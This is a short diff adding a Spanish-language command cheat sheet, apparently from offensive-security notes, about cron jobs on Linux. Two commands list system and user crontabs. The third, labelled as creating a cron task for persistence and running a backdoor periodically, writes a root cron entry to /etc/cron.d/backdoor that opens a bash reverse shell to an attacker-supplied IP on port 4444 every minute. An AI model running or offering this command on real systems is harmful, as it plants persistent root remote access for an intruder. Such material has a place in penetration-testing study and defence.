@@ -1,0 +1,6 @@
+▶ Listar Tareas Cron del Sistema (Ver tareas programadas):
+  cat /etc/crontab
+▶ Listar Tareas Cron del Usuario (Ver crontab del usuario actual):
+  crontab -l
+▶ Crear Tarea Cron para Persistencia (Ejecutar backdoor periódicamente):
+  echo "* * * * * root bash -i >& /dev/tcp/$IP/4444 0>&1" > /etc/cron.d/backdoor
